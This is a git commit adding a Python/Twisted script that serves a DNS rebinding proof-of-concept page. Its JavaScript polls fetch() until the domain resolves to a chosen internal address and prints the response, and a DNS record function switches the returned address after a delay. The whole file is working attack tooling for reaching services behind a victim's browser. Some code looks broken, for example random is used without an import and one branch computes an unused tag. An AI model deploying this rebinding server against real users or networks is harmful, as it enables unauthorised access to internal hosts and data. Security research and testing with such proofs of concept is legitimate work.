426e7d92c336c833de6ec673eb202877a5fc55dc
Alex Chapman <3729326+ajxchapman@users.noreply.github.com>
2018-03-16 15:53:00 +0000

    DNS Rebinding example

---
+++ files/scripts/dnsrebind.py
@@ -0,0 +1,109 @@
+import time
+
+from twisted.web.resource import Resource
+
+html_instructions = """
+"""
+
+html_rebind = """
+<html>
+<body>
+  <h1>DNS Rebinding PoC - Rebinding to {rebind_address}</h1>
+  <h2>Sending rebind request in <span id="counter">...</span> seconds</h2>
+<div id="log"></div>
+<script>
+var rebindTimer = 20;
+var rebindPath = "/";
+
+function log(msg) {
+  var text = document.createTextNode(msg);
+  var pre = document.createElement("pre");
+  pre.setAttribute("style", "white-space: pre-wrap;");
+  pre.appendChild(text);
+  document.getElementById("log").appendChild(pre);
+}
+
+function countdown() {
+  var interval;
+  var counter = rebindTimer;
+
+  function step() {
+    counter -= 1;
+    document.getElementById("counter").innerHTML = counter;
+    if (counter == 0) {
+      clearInterval(interval)
+    }
+  }
+  interval = setInterval(function(){ step() }, 1000);
+}
+
+async function run() {
+  try {
+    var resp = await fetch(rebindPath).then((response) => response.text());
+    log("[+] Success");
+    log(resp);
+  }
+  catch(e) {
+    log("[-] Retrying...");
+    countdown();
+    return setTimeout(run, rebindTimer * 1000);
+  }
+}
+
+log("Starting...");
+countdown();
+setTimeout(run, rebindTimer * 1000);
+</script>
+</body>
+</html>
+"""
+
+rebind_mappings = {}
+
+class RebindPage(Resource):
+    isLeaf = True
+
+    def render_GET(self, request):
+        print("render_GET called", request.path)
+        domain = request.getRequestHostname().decode()
+        path = request.path.decode()
+
+        if path.startswith("/reset"):
+            rebind_mappings.clear()
+            request.setResponseCode(302)
+            request.setHeader("Location", "/")
+            request.setHeader("Content-Type", "text/html; charset=UTF-8")
+            return "Redirecting...".encode()
+
+        elif path.startswith("/set/"):
+            address = path.split("/set/")[1]
+            rebindtag = "t" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(6))
+
+            request.setResponseCode(302)
+            request.setHeader("Location", "/dnsrebind/")
+            request.setHeader("Content-Type", "text/html; charset=UTF-8")
+            return "Redirecting...".encode()
+
+        elif path.startswith("/get/"):
+            rebindtag = domain.split(".dnsrebind.")[0]
+            address = path.split("/get/")[1]
+
+            rebind_mappings[rebindtag] = {}
+            rebind_mappings[rebindtag]["address"] = address
+            rebind_mappings[rebindtag]["time"] = time.time() + 2
+            return html_rebind.replace("{rebind_address}", address).encode()
+
+        return html_instructions.encode()
+
+
+def get_record(lookup_name, lookup_cls, lookup_type):
+    rebindtag = lookup_name.decode().split(".dnsrebind.")[0]
+    if rebindtag in rebind_mappings:
+        if rebind_mappings[rebindtag]["time"] < time.time():
+            return rebind_mappings[rebindtag]["address"]
+
+    return "{ipv4}"
+
+
+def get_resource(request):
+    return RebindPage()
